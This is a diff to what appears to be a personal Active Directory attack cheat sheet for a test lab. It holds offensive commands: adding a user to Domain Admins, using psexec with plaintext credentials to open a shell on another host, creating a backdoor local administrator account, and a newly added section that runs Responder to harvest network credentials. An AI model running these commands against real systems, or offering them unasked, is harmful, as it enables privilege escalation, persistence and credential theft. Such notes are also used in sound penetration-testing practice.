@@ -68,7 +68,16 @@ Add-ADGroupMember -Identity “Domain Admins” -Members hplovecraft
 - Psexec add user to another host
 ```
 CD into psexec directory
-psexec.exe \\MagicRainbowPC.domain.local -u DNDUser -p passwordhere cmd
+psexec.exe \\MagicRainbowPC.domain.local -i -u DNDUser -p passwordhere cmd
 net user MyNewUser MyPassword#@$ /add
 net localgroup administrators MyNewUser /add
+```
+
+5. Credential Harvesting
+- Using Responder
+```
+Ifconfig
+responder -I eth1 -wrf 
+Log in to win10 test box
+Go to //blahblahblah
 ```
